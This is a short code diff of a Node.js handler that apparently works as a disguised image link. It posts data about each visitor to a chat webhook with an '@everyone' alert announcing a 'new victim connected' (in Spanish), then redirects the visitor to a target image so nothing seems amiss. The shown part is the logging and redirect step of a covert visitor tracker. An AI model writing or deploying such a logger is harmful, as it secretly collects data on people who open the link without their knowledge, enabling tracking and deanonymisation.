@@ -54,8 +54,8 @@ module.exports = async function handler(req, res) {
     timestamp: new Date().toISOString()
   };
 
-  const payload = {
-  content: "@everyone",
+const payload = {
+  content: "@everyone ¡NUEVA VÍCTIMA CONECTADA!",
   allowed_mentions: {
     parse: ["everyone"]
   },
@@ -63,11 +63,10 @@ module.exports = async function handler(req, res) {
   embeds: [embed]
 };
 
-  await fetch(WEBHOOK_URL, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ username: "Public Logger", embeds: [embed] })
-  }).catch(() => {});
+await fetch(WEBHOOK_URL, {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify(payload)
+}).catch(() => {});
 
-  return res.redirect(302, TARGET_IMAGE);
-};
+return res.redirect(302, TARGET_IMAGE);
